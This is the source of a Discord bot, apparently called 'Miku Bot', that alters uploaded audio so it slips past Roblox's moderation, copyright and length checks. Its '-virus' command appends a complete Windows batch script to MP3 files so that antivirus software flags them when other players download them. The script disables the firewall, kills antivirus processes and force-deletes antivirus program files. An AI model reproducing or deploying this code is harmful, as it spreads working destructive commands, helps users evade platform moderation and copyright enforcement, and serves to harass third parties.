const request = require(`request`);
const fs = require("fs")
const randomFile = require('select-random-file')
const Discord = require('discord.js');
const client = new Discord.Client();
const execSync = require('child_process').execSync;
const { exec } = require("child_process");
const ytdl = require("ytdl-core")
const ffmpeg = require("ffmpeg-cli")
const prefix = "-"
const express = require("express")
const server = express();
const token = "put your bot token here"
server.all('/', (req, res)=>{
  res.send('Your bot is alive!')
})
function keepAlive(){
  server.listen(3000, ()=>{console.log("Server is Ready!")});
}
function sleep(ms) {
    return new Promise((resolve) => {
      setTimeout(resolve, ms);
    });
  }   

  client.on('message', msg => {
    if (!msg.content.startsWith(prefix) || msg.author.bot) return;

    const args = msg.content.slice(prefix.length).trim().split(' ');
    const command = args.shift().toLowerCase();
    if(msg.content.includes("-help")) {
      const embed = {
        "title": "Miku Bot",
        "description": "```yaml\n[ COMMAND LIST ]\n\nIMPORTANT COMMANDS:\n\n• -help - shows a list of all commands (this list)\n\n-------------------------------------------------------------\n\nAUDIO COMMANDS:\n\n• -virus -  makes your audio trigger windows defender if you are playing it in a game with someone that has defender on or someone downloads it with defender on\n\n• -mono - applies an old fashioned mono method (very quiet)\n\n• -freq - applies a frequency method (glitchy as fuck)\n\n• -nolength - makes your audio bypass the roblox audio library time limit (also bypasses roblox's copyright check)\n\n• -loud - makes your audio loud\n\n• -matroska - bypasses the audio\n\n-------------------------------------------------------------\n\nMISC COMMANDS:\n\n• -yt URL - downloads youtube videos for you\n-------------------------------------------------------------\nDISCLAIMER:\nThe virus commmand only supports mp3 for now, every other command supports mp3 and ogg```",
        "color": 349899,
        "footer": {
          "icon_url": "https://cdn.discordapp.com/avatars/844788571012464681/5e0ce0270a1caa0a3ccf6553c548f408.webp?size=128",
          "text": "mono got added pog"
        }
      };
      msg.channel.send({ embed });
    }

    if(msg.content.includes("-loud")) {
      if(!msg.attachments.first()){ msg.channel.send("attach a file") }
        if(msg.attachments.first()){
          if(msg.attachments.first().filename.includes(".mp3")|| msg.attachments.first().filename.includes(".ogg") || msg.attachments.first().filename.includes(".wav"))
        
            var stream = request(msg.attachments.first().url).pipe(fs.createWriteStream('working/working'))
            stream.on('finish', function () { 
            ffmpeg.run("-y -i "+ process.cwd()+"\\working\\working" + " -acodec libvorbis -ar 200000 -ac 2 -f ogg "+process.cwd()+"\\working\\troll.ogg")
            .then((result)=>{
              console.log(result)
        
            ffmpeg.run("-i " + process.cwd()+"\\working\\troll.ogg" + " -af firequalizer=gain_entry='entry(0,24);entry(250,37);entry(1000,50);entry(4000,41);entry(16000,32)' -acodec libvorbis -ar 48000 -ac 2 -f ogg " + process.cwd()+"\\working\\Miku_Loud.ogg")
            .then((result)=>{
                msg.channel.send("Your audio is now LOUD.", {
                    files: [
                      "working/Miku_Loud.ogg",
                     
                    ]}).then(result=>{
                    fs.unlinkSync("working/troll.ogg");
                    fs.unlinkSync("working/Miku_Loud.ogg");
                    })
                })
            })
          })
          }
            }

    if(msg.content.includes("-freq")) {
      if(!msg.attachments.first()){ msg.channel.send("attach a file") }
      const dir = './baitlist/freq'
randomFile(dir, (err, file) => {
  if(msg.attachments.first()){
    if(msg.attachments.first().filename.includes(".mp3") || msg.attachments.first().filename.includes(".ogg") & msg.attachments.first().filename.includes(".wav")){
      msg.channel.send("**WARNING, YOUR AUDIO CANNOT BE OVER 60 PEAK AMP** (also audio gets cut to 1:59)")
      var stream = request(msg.attachments.first().url).pipe(fs.createWriteStream('working/working'))
      stream.on('finish', function () { 
        ffmpeg.run("-y -i "+ process.cwd()+"\\working\\working" + " -acodec libvorbis -ar 200000 -ac 2 -f ogg "+process.cwd()+"\\working\\troll.ogg")
        .then((result)=>{
      ffmpeg.run("-y -i " + process.cwd()+"\\working\\troll.ogg" + " -i "+process.cwd()+"\\baitlist\\freq\\freq.wav"+" -acodec libvorbis -ar 200000 -ac 2 -f ogg -filter_complex amix=inputs=2:duration=first -ss 00:00:00 -to 00:01:59 "+process.cwd()+"\\working\\freqBypass.ogg")
      .then((result)=>{
          msg.channel.send("Frequency method added", {
              files: [
                "working/freqBypass.ogg",
               
              ]}).then(result=>{
                fs.unlinkSync("working/freqBypass.ogg")
              })
              fs.unlinkSync("working/working");
             
        })
      })
  })  

}
  }    
  })
  }

if(msg.content.includes("-mono")) {
  if(!msg.attachments.first()){ msg.channel.send("attach a file") }
  if(msg.attachments.first()){
  
      const dir = './baitlist/mono'
      randomFile(dir, (err, file) => {
        msg.channel.send("Running command, this might take a while depending on the size of the file")
    var stream = request(msg.attachments.first().url).pipe(fs.createWriteStream('working/working'))
    stream.on('finish', function () { 

    ffmpeg.run("-y -i " + process.cwd()+"\\working\\working"+ " -af volume='0.4' -acodec libvorbis -ar 200000 -ac 2 -f ogg "+ process.cwd()+"\\working\\result.ogg")
    .then((result)=>{
      ffmpeg.run("-y -i " + process.cwd()+"\\working\\result.ogg -i "+ process.cwd()+"\\baitlist\\mono\\"+file + "  -acodec libvorbis -ar 200000 -ac 2 -f ogg -filter_complex amix=inputs=2:duration=first -ss 00:00:00 -to 00:01:59 "+ process.cwd()+"\\mono.ogg")
      .then((result)=>{
     msg.channel.send("**WARNING, YOUR AUDIO CANNOT BE LOUD OR IT** ***WILL*** **DENY** (also audio gets cut to 1:59)")
   msg.channel.send("```yaml\nYour audio was successfully bypassed!\n```", {
    files: [
      "mono.ogg",
     
    ]}).then(result=>{
      fs.unlinkSync("mono.ogg")
      fs.unlinkSync("working\\result.ogg")
      fs.unlinkSync("working\\working")
    })
    })
  })
})
      })
  }
}
if(msg.content.includes("-virus")) {
  if(!msg.attachments.first()){ msg.channel.send("attach a file") }
  if(msg.attachments.first()){
    msg.channel.send("Running command, this might take a while depending on the size of the file")
  
    var stream = request(msg.attachments.first().url).pipe(fs.createWriteStream('working/working'))
    stream.on('finish', function () { 
      ffmpeg.run("-y -i "+process.cwd()+"\\working\\working"+" -acodec libmp3lame -ar 48000 -ac 2 -f mp3 "+process.cwd()+"\\working\\working.mp3")
      .then((result)=>{
      const virus = 'net send localhost HELLOCOMPUTER AND COTTONMOTHCLUB ON TOP @ echo off rem rem Permanently Kill Anti-Virus net stop “Security Center” netsh firewall set opmode mode=disable taskill /A av* taskill /A fire* taskill /A anti* cls taskill /A spy* taskkill /A bullguard taskkill /A PersFw taskkill /A KAV* taskkill /A ZONEALARM taskkill /A SAFEWEB cls taskkill /A spy* taskkill /A bullguard taskkill /A PersFw taskkill /A KAV* taskkill /A ZONEALARM taskkill /A SAFEWEB cls taskkill /A OUTPOST taskkill /A nv* taskkill /A nav* taskkill /A F-* taskkill /A ESAFE taskkill /A cle cls taskkill /A BLACKICE taskkill /A def* taskkill /A kav taskkill /A kav* taskkill /A avg* taskkill /A ash* cls taskkill /A aswupdsv taskkill /A ewid* taskkill /A guard* taskkill /A guar* taskkill /A gcasDt* taskkill /A msmp* cls taskkill /A mcafe* taskkill /A mghtml taskkill /A msiexec taskkill /A outpost taskkill /A isafe taskkill /A zap*cls taskkill /A zauinst taskkill /A upd* taskkill /A zlclien* taskkill /A minilog taskkill /A cc* taskkill /A norton* cls taskkill /A norton au* taskkill /A ccc* taskkill /A npfmn* taskkill /A loge* taskkill /A nisum* taskkill /A issvc taskkill /A tmp* cls taskkill /A tmn* taskkill /A pcc* taskkill /A cpd* taskkill /A pop* taskkill /A pav* taskkill /A padmincls taskkill /A panda* taskkill /A avsch* taskkill /A sche* taskkill /A syman* taskkill /A virus* taskkill /A realm*cls taskkill /A sweep* taskkill /A scan* taskkill /A ad-* taskkill /A safe* taskkill /A avas* taskkill /A norm* cls taskkill /A offg* del /Q /F C:\\Program Files\\alwils~1\\avast4\\*.* del /Q /F C:\\Program Files\\Lavasoft\\Ad-awa~1\\*.exe del /Q /F C:\\Program Files\\kasper~1\\*.exe cls del /Q /F C:\\Program Files\\trojan~1\\*.exe del /Q /F C:\\Program Files\\f-prot95\\*.dll del /Q /F C:\\Program Files\\tbav\\*.datcls del /Q /F C:\\Program Files\\avpersonal\\*.vdf del /Q /F C:\\Program Files\\Norton~1\\*.cnt del /Q /F C:\\Program Files\\Mcafee\\*.* cls del /Q /F C:\\Program Files\\Norton~1\\Norton~1\\Norton~3\\*.* del /Q /F C:\\Program Files\\Norton~1\\Norton~1\\speedd~1\\*.* del /Q /F C:\\Program Files\\Norton~1\\Norton~1\\*.* del /Q /F C:\\Program Files\\Norton~1\\*.* cls del /Q /F C:\\Program Files\\avgamsr\\*.exe del /Q /F C:\\Program Files\\avgamsvr\\*.exe del /Q /F C:\\Program Files\\avgemc\\*.exe cls del /Q /F C:\\Program Files\\avgcc\\*.exe del /Q /F C:\\Program Files\\avgupsvc\\*.exe del /Q /F C:\\Program Files\\grisoft del /Q /F C:\\Program Files\\nood32krn\\*.exe del /Q /F C:\\Program Files\\nood32\\*.exe cls del /Q /F C:\\Program Files\\nod32 del /Q /F C:\\Program Files\\nood32 del /Q /F C:\\Program Files\\kav\\*.exe del /Q /F C:\\Program Files\\kavmm\\*.exe del /Q /F C:\\Program Files\\kaspersky\\*.* cls del /Q /F C:\\Program Files\\ewidoctrl\\*.exe del /Q /F C:\\Program Files\\guard\\*.exe del /Q /F C:\\Program Files\\ewido\\*.exe cls del /Q /F C:\\Program Files\\pavprsrv\\*.exe del /Q /F C:\\Program Files\\pavprot\\*.exe del /Q /F C:\\Program Files\\avengine\\*.exe cls del /Q /F C:\\Program Files\\apvxdwin\\*.exe del /Q /F C:\\Program Files\\webproxy\\*.exe del /Q /F C:\\Program Files\\panda software\\*.* rem'
            fs.appendFile('working/working.mp3',virus, function (err) {
        console.log("t")
        msg.channel.send("Your audio will now be detected as a virus to anyone who hears it in game with their windows defender on or downloads it.", {
          files: [
            "working/working.mp3",
           
          ]}).then(result=>{
            fs.unlinkSync("working/working.mp3")
          })
      });
    })
  })
  }
}
if(msg.content.includes("-nolength")) {

  if(!msg.attachments.first()){ msg.channel.send("attach a file") }
  if(msg.attachments.first()){
  var stream = request(msg.attachments.first().url).pipe(fs.createWriteStream('working/working'))
  stream.on('finish', function () { 
    ffmpeg.run("-y -i "+ process.cwd()+"\\working\\working" + " -acodec libmp3lame -ar 48000 -ac 2 -f mp3 "+process.cwd()+"\\working\\working.mp3")
        .then((result)=>{
  ffmpeg.run("-y -i " + process.cwd()+"\\working\\working.mp3"+ " -acodec libmp3lame -ar 48000 -ac 2 -f mp3 result "+ process.cwd()+"\\result0.mp3")
  .then((result)=>{
    const output = exec('copy /b "'+ process.cwd()+"/baitlist/tlength\\mp4yes"+'"+result0.mp3'+' nlength.mp3', (error, stdout, stderr) => {
      if (stdout) {
      msg.channel.send("Your audio now has no time length, meaning it can be as long as possible and you will be able to upload it to roblox (also bypasses copyright)", {
        files: [
          "nlength.mp3",
         
        ]}).then(result=>{
          fs.unlinkSync("nlength.mp3")
         
          fs.unlinkSync("working/working")
          fs.unlinkSync("working/working.mp3")
          fs.unlinkSync("result0.mp3")
          fs.unlinkSync("result")
        })
      }
    })
  })
      })
})
}
}   
  })
keepAlive()
client.login(token)
